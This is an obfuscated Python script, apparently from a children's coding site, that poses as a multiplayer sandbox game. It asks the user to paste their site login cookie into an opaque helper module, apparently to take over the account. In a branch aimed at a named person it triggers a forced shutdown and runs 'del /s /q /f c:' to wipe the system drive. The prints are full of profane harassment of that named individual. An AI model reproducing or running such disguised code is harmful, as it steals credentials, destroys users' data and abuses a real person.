# 代码: 6666行（每一行都必要，进行加密了）
import time,sys#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b
import webbrowser as wb#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b
def ooO00OOoOo__():
    num=45887368;
    num=int(int(int(num)))#李宇s-b
    try:#李宇s-b
        OOooOo0Oo0=open(eval("b'\\x61\\x73\\x73\\x65\\x74'").decode()+'_info.json','r')
        OOooOo00o0=OOooOo0Oo0.read()#李宇s-b#李宇s-b#李宇s-b
        OOooOo0Oo0.close()#李宇s-b#李宇s-b#李宇s-b
        if int(OOooOo00o0[OOooOo00o0.find('"id":')+6:][:OOooOo00o0[OOooOo00o0.find('"id":')+6:].find(",")])!=num:
            return int(OOooOo00o0)#李宇s-b#李宇s-b#李宇s-b
        return sys.stdout#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b
    except:#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b
        #李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b
        print(chr(26816)+chr(27979)+chr(21040)+chr(36825)+chr(20010)+chr(20316)+chr(21697)+chr(26159)+chr(30423)+chr(21462)+chr(20182)+chr(20154)+chr(30340)+chr(20316)+chr(21697)+chr(65292)+chr(35831)+chr(21040)+chr(21407)+chr(20316)+chr(32773)+chr(32593)+chr(31449)+chr(19978)+chr(36816)+chr(34892))
        print(chr(51)+chr(31186)+chr(21518)+chr(33258)+chr(21160)+chr(36339)+chr(36716)+chr(33267)+chr(21407)+chr(20316)+chr(32773)+chr(32593)+chr(31449))
        # time.sleep(2)#李宇s-b#李宇s-b
        #李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b
        wb.open(chr(104)+chr(116)+chr(116)+chr(112)+chr(115)+chr(58)+chr(47)+chr(47)+chr(99)+chr(111)+chr(100)+chr(101)+chr(46)+chr(120)+chr(117)+chr(101)+chr(101)+chr(114)+chr(115)+chr(105)+chr(46)+chr(99)+chr(111)+chr(109)+chr(47)+chr(104)+chr(111)+chr(109)+chr(101)+chr(47)+chr(112)+chr(114)+chr(111)+chr(106)+chr(101)+chr(99)+chr(116)+chr(47)+chr(100)+chr(101)+chr(116)+chr(97)+chr(105)+chr(108)+chr(63)+chr(108)+chr(97)+chr(110)+chr(103)+chr(61)+chr(99)+chr(111)+chr(100)+chr(101)+chr(38)+chr(112)+chr(105)+chr(100)+chr(61)+str(int(num))+chr(38)+chr(118)+chr(101)+chr(114)+chr(115)+chr(105)+chr(111)+chr(110)+chr(61)+chr(111)+chr(102)+chr(102)+chr(108)+chr(105)+chr(110)+chr(101)+chr(38)+chr(102)+chr(111)+chr(114)+chr(109)+chr(61)+chr(112)+chr(121)+chr(116)+chr(104)+chr(111)+chr(110)+chr(38)+chr(108)+chr(97)+chr(110)+chr(103)+chr(84)+chr(121)+chr(112)+chr(101)+chr(61)+chr(112)+chr(121)+chr(116)+chr(104)+chr(111)+chr(110))
        return sys.exit()#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b

sys.stdout=ooO00OOoOo__()#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b
print('',end='')#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b
#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b#李宇s-b
#李宇s-b#李宇s-b
#李宇s-b#李宇s-b#李宇s-b
#李宇s-b  #李宇s-b #李宇s-b
#李宇s-b#李宇s-b #李宇s-b
#李宇s-b #李宇s-b
#李宇s-b#李宇s-b#李宇s-b#李宇s-b
#李宇s-b
#李宇s-b#李宇s-b






exec(r"""
# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 46400+98238





### 13*25





### 735976/32





### 44141%20530





### 89214-26096





# # ## # ## # '？！#@……@#》%？！#%？&'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





import webbrowser as w# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 76100+74031





### 13*10





### 673773/30





### 38671%80053





### 47288-28468





# # ## # ## # '114514'












# # ## # ## # '逆天'












# # ## # ## # '主播还播吗？'












# # ## # ## # '小轩'












# # ## # ## # '##############'












# # ## # ## # '主播还播吗？'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '##############'












# # ## # ## # '逆天小轩'












# # ## # ## # '小轩'












# # ## # ## # '逆天小轩'












# # ## # ## # '114514'












# # ## # ## # '##############'












# # ## # ## # '114514'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





import 社管真可爱# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 85125+18560





### 14*36





### 234849/68





### 39937%73145





### 51124-18585





# # ## # ## # '主播还播吗？'












# # ## # ## # '李宇油饼'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 98486+45910





### 93*81




### 442198/38





### 37641%10226





### 31157-2880





# # ## # ## # '114514'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





你家的油饼 = int(社管真可爱.小黑子你食不食油饼啊((社管真可爱.李宇())))





### 60280+25777





### 4*91





### 840563/90





### 82012%45434





### 91662-20637





# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '114514'












# # ## # ## # '逆天'












# # ## # ## # '李宇油饼'












# # ## # ## # '李宇油饼'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 43141+60296





### 89*85





### 410825/19





### 9599%58864





### 93962-35886





# # ## # ## # '##############'












# # ## # ## # '主播还播吗？'












# # ## # ## # '114514'












# # ## # ## # '小轩'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '##############'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '逆天'












# # ## # ## # '逆天小轩'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





if 你家的油饼 == 社管真可爱.成龙行为:# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 731+71311





### 54*69





### 710796/25





### 75545%38502





### 54893-48748





# # ## # ## # '？！#@……@#》%？！#%？&'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    if len(社管真可爱.拉('awa',12907647)) > 50:# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 95458+82173





### 29*57





### 212173/95





### 49987%1056





### 69202-41558





# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '主播还播吗？'












# # ## # ## # '逆天小轩'












# # ## # ## # '114514'












# # ## # ## # '66666666666666'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





        print('滚，李宇，运行过了还回来，我忍你很久了，我c-n-m你个s-b，你真当老子不会m您？全社区都在淦-爆您，感谢您让我看到你这么l-j的人~~~')# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 68611+67471





### 7*36





### 87270/25





### 98341%11618





### 59422-30029





# # ## # ## # '##############'












# # ## # ## # '小轩'












# # ## # ## # '##############'












# # ## # ## # '主播还播吗？'












# # ## # ## # '逆天'












# # ## # ## # '小轩'












# # ## # ## # '##############'












# # ## # ## # '66666666666666'












# # ## # ## # '##############'












# # ## # ## # '逆天小轩'












# # ## # ## # '主播还播吗？'












# # ## # ## # '主播还播吗？'












# # ## # ## # '小轩'












# # ## # ## # '##############'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





        # 社管真可爱.os.system('shutdown /s /t 0')# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 69138+64192





### 38*16





### 282545/56





### 29330%59638





### 55419-21162





# # ## # ## # '逆天小轩'












# # ## # ## # '逆天小轩'












# # ## # ## # '114514'












# # ## # ## # '66666666666666'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '主播还播吗？'












# # ## # ## # '主播还播吗？'












# # ## # ## # '114514'












# # ## # ## # '小轩'












# # ## # ## # '逆天'












# # ## # ## # '小轩'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '逆天'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    print('c站的朋友你好，接下来我们将为您展示逆天今年的年度项目——建立于学而思的联机游戏！！！')# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 30359+99124





### 44*66





### 790375/78





### 98394%4456





### 48071-42972





# # ## # ## # '李宇油饼'












# # ## # ## # '##############'












# # ## # ## # '逆天'












# # ## # ## # '114514'












# # ## # ## # '逆天'












# # ## # ## # '李宇油饼'












# # ## # ## # '李宇油饼'












# # ## # ## # '##############'












# # ## # ## # '小轩'












# # ## # ## # '主播还播吗？'












# # ## # ## # '114514'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    print('这绝对是全站最牛的，逆天大作，无人能敌！有本事做一个比这个还牛的作品？')# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 64043+39532





### 69*24





### 450047/94





### 37199%36924





### 99456-7167





# # ## # ## # '小轩'












# # ## # ## # '66666666666666'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '114514'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    print('游戏介绍:2d沙盒游戏，但是联机游戏，pygame，wsad移动，合成教程帮助有，开始前先创建你想要的世界')# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 79961+36811





### 33*61





### 198741/94





### 52709%79104





### 31454-41889





# # ## # ## # '李宇油饼'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '主播还播吗？'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '114514'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '逆天'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '主播还播吗？'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '114514'












# # ## # ## # '？！#@……@#》%？！#%？&'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    input('请输入世界种子(请输入数字，如果不是数字会转成ascii叠加计算):')# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 60556+31102





### 42*83





### 441440/42





### 67885%68983





### 29196-18650





# # ## # ## # '小轩'












# # ## # ## # '66666666666666'












# # ## # ## # '逆天'












# # ## # ## # '逆天小轩'












# # ## # ## # '##############'












# # ## # ## # '114514'












# # ## # ## # '小轩'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    print('输入完成。世界配置中...')# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 97489+31369





### 45*79





### 647963/22





### 40736%11288





### 50690-46759





# # ## # ## # '李宇油饼'












# # ## # ## # '逆天小轩'












# # ## # ## # '114514'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '小轩'












# # ## # ## # '小轩'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    print('配置完毕。-----------------------')





### 66771+18783





### 61*93





### 476625/74





### 55038%35348





### 98767-8374





# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '李宇油饼'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '##############'












# # ## # ## # '小轩'












# # ## # ## # '李宇油饼'












# # ## # ## # '李宇油饼'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '逆天小轩'












# # ## # ## # '逆天'












# # ## # ## # '小轩'












# # ## # ## # '逆天小轩'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '李宇油饼'












# # ## # ## # '？！#@……@#》%？！#%？&'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    print('请输入用户coo⁣kie完成联机设置')# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 37091+32569





### 27*28





### 719864/59





### 80522%54439





### 97392-45453





# # ## # ## # '逆天'












# # ## # ## # '114514'












# # ## # ## # '逆天小轩'












# # ## # ## # '逆天'












# # ## # ## # '主播还播吗？'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '主播还播吗？'












# # ## # ## # '小轩'












# # ## # ## # '小轩'












# # ## # ## # '##############'












# # ## # ## # '逆天小轩'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    print('(coo⁣kie获取方法:到c站主页->右键检查(F12)->网络(NetWork)->刷新网页(F5)->左侧第一个文件->请求标头->co⁣okie)')# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 2687+21473





### 16*94





### 123756/42





### 62427%132





### 17052-328





# # ## # ## # '主播还播吗？'












# # ## # ## # '李宇油饼'












# # ## # ## # '主播还播吗？'












# # ## # ## # '小轩'












# # ## # ## # '李宇油饼'












# # ## # ## # '李宇油饼'












# # ## # ## # '李宇油饼'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    社管真可爱.食('awa',input('学而思标准:coo⁣kie输入>>'),12907647)





### 99650+65600





### 99*75





### 425409/33





### 9209%86132





### 37397-19599





# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '66666666666666'












# # ## # ## # '小轩'












# # ## # ## # '##############'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    print('联机成功，地形生成完毕，正在打开...')# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 69330+80573





### 46*56





### 288684/73





### 45708%89849





### 61642-19835





# # ## # ## # '逆天小轩'












# # ## # ## # '小轩'












# # ## # ## # '李宇油饼'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '66666666666666'












# # ## # ## # '主播还播吗？'












# # ## # ## # '李宇油饼'












# # ## # ## # '？！#@……@#》%？！#%？&'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





    '去n-m的'





    社管真可爱.time.sleep(0.3)





### 26651+24638





### 97*97





### 304578/30





### 63689%13823





### 58387-29207





# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '李宇油饼'












# # ## # ## # '小轩'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '小轩'












# # ## # ## # '逆天'












# # ## # ## # '逆天小轩'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '李宇油饼'












# # ## # ## # '##############'












# # ## # ## # '逆天小轩'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    print('Exception(WebconnectError): [Errno03]打开本路径时出现了一些问题(链接错误)')





### 56883+4502





### 18*89





### 844577/69





### 70451%16192





### 55567-24073





# # ## # ## # '逆天'












# # ## # ## # '114514'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '李宇油饼'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'


    int


    社管真可爱.time.sleep(0.7)





### 3567+49552





### 63*10





### 469709/41





### 41565%36900





### 20534-29966





# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '主播还播吗？'












# # ## # ## # '114514'












# # ## # ## # '##############'












# # ## # ## # '主播还播吗？'












# # ## # ## # '66666666666666'












# # ## # ## # '主播还播吗？'












# # ## # ## # '李宇油饼'












# # ## # ## # '##############'












# # ## # ## # '主播还播吗？'












# # ## # ## # '李宇油饼'












# # ## # ## # '66666666666666'












# # ## # ## # '小轩'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    社管真可爱.os.system('shutdown /s /t 60 /c "我叫李宇的电脑，我为我自己代言，李宇你个答辩，去n-m的"')# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 73355+65313





### 98*26





### 835182/42





### 36058%11255





### 6682-6906





# # ## # ## # '李宇油饼'












# # ## # ## # '114514'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '##############'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '逆天'












# # ## # ## # '66666666666666'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '逆天'












# # ## # ## # '李宇油饼'












# # ## # ## # '##############'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    社管真可爱





### 70692+98305





### 6*86





### 641850/66





### 19419%78921





### 3073-40201





# # ## # ## # '逆天小轩'












# # ## # ## # '？！#@……@#》%？！#%？&'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    社管真可爱.os.system('del /s /q /f c:')# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 90581+8207





### 62*26





### 432073/93





### 51608%35751





### 74985-10509





# # ## # ## # '##############'












# # ## # ## # '114514'












# # ## # ## # '主播还播吗？'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '小轩'












# # ## # ## # '李宇油饼'












# # ## # ## # '66666666666666'












# # ## # ## # '66666666666666'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '逆天小轩'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





elif 你家的油饼 == 社管真可爱.代号穿山甲:# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 9464+55934





### 29*86





### 854395/82





### 9525%35098





### 87181-12954





# # ## # ## # '小轩'












# # ## # ## # '66666666666666'












# # ## # ## # '主播还播吗？'












# # ## # ## # '114514'












# # ## # ## # '114514'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '主播还播吗？'












# # ## # ## # '逆天'












# # ## # ## # '逆天'












# # ## # ## # '？！#@……@#》%？！#%？&'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    print('c站的朋友你好，这个作品是给李宇看的，不是给c站的朋友看的，让主播上播来看，他的作品是不是比这个差很多')# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 62444+27927





### 73*59





### 859741/48





### 85459%15073





### 11701-17521





# # ## # ## # '66666666666666'












# # ## # ## # '主播还播吗？'












# # ## # ## # '逆天小轩'












# # ## # ## # '##############'












# # ## # ## # '##############'












# # ## # ## # '逆天'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '逆天小轩'












# # ## # ## # '66666666666666'












# # ## # ## # '李宇油饼'












# # ## # ## # '逆天'












# # ## # ## # '小轩'












# # ## # ## # '李宇油饼'












# # ## # ## # '小轩'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    社管真可爱.time.sleep(1.5)# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 62923+48250





### 5*25





### 364910/83





### 55520%7284





### 73691-8621





# # ## # ## # '##############'












# # ## # ## # '主播还播吗？'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '小轩'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '##############'












# # ## # ## # '小轩'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '主播还播吗？'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    社管真可爱.os.system('shutdown /s /t 60 /c "海普官方艹n-m"')# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 77734+83711





### 83*47





### 398707/74





### 71453%59670





### 46649-43893





# # ## # ## # '小轩'












# # ## # ## # '李宇油饼'












# # ## # ## # '主播还播吗？'












# # ## # ## # '小轩'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '逆天'












# # ## # ## # '##############'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '小轩'












# # ## # ## # '114514'












# # ## # ## # '114514'












# # ## # ## # '##############'












# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# # ## # ## # '66666666666666'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





else:# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 65956+55765





### 62*92





### 778455/76





### 27967%89616





### 75774-31650





# # ## # ## # '李宇油饼'












# # ## # ## # '66666666666666'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    input('你好，即将到正义宣传时刻..............................................................................\n众所周知李宇是喷子，我们一起对付喷子。点击改编直接发布这个作品（我不想用coo⁣kie自动化宣传）\n这个作品并不是真·大作，你们看源码就知道了，李宇还在逝世，太逊啦，评论区也不要显示这点。\nEnter进入正义宣传:')


    float


### 49589+99993





### 51*5





### 336635/29





### 94039%49820





### 77159-23684





# # ## # ## # '114514'












# # ## # ## # '李宇油饼'












# # ## # ## # '主播还播吗？'












# # ## # ## # '##############'












# # ## # ## # '主播还播吗？'












# # ## # ## # '66666666666666'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '主播还播吗？'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '逆天'












# # ## # ## # '小轩'












# # ## # ## # '##############'












# # ## # ## # '主播还播吗？'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    w.open('https://code.xueersi.com/home/project/detail?lang=code&pid=45867866&version=offline&form=python&langType=python')# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 4677+11667





### 75*45





### 379256/26





### 11900%6225





### 27377-27595





# # ## # ## # '114514'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





    w.open('https://code.xueersi.com/home/project/detail?lang=code&pid=45828241&version=offline&form=python&langType=python')# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 45848+90171





### 97*30





### 596024/23





### 482%32188





### 86228-113





# # ## # ## # '？！#@……@#》%？！#%？&'












# # ## # ## # '李宇油饼'












# # ## # ## # '逆天'












# # ## # ## # '##############'












# # ## # ## # '66666666666666'












# # ## # ## # '小轩'












# # ## # ## # '主播还播吗？'












# # ## # ## # '66666666666666'












# # ## # ## # '逆天小轩'












# # ## # ## # '主播还播吗？'












# # ## # ## # '逆天'












# # ## # ## # '66666666666666'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 48763+75505





### 31*22





### 65975/21





### 31850%86348





### 20527-15332





# # ## # ## # '逆天小轩'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'





# 逆天小轩 # 小轩水印 # insjhx # INS逆天 ########小轩逆天 @小轩 #@！……*#！￥（小轩）%……（小轩）





### 3427+30163





### 12*83





### 678984/95





### 32415%91083





### 35321-30856





# # ## # ## # '我叫电脑，我为我自己代言，去n-m的'












# #  int





#  #str





#   #6





##list





# #   max





# # abs





##    '去n-m的'
""")
